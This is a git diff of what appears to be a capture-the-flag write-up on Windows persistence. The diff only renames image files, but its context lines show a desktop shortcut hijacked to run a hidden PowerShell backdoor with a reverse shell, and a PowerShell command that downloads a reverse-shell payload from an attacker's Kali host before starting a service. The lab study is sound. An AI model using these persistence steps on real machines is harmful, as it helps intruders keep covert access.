@@ -222,7 +222,7 @@ For this task, let's check the shortcut to **calc** on the Administrator's deskt
 
 **Target:** powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties.
 
@@ -347,7 +347,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
